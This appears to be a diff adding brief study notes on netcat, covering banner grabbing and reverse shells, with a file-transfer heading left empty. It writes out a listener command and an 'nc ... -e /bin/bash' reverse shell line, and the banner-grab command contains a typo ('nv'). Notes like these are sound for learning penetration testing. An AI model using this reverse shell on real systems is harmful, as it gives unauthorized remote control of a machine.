@@ -1,0 +1,26 @@
+What is Netcat?
+    netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network 
+        connections using TCP or UDP.
+    
+Banner Grabbing with Netcat:
+
+    What Is Banner Grabbing?
+        Banner grabbing is a technique used to gain information about a computer system on a network and the 
+            services running on its open ports.
+    
+    Command to Grab Banner:
+        nv -nv <ip> <port> # Don't Use alligator signs in actual command.
+
+Reverse Shell With Netcat:
+
+    What Is Reverse Shell?
+        A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.
+            The attacking machine has a listener port on which it receives the connection, which by using, code or 
+            command execution is achieved.
+
+    start a listener with command nc -lvnp <port> and connect to the listener with command nc -nv <ip of the listener
+        machine> <port> -e /bin/bash
+
+File Transfer With Netcat:
+    
+    
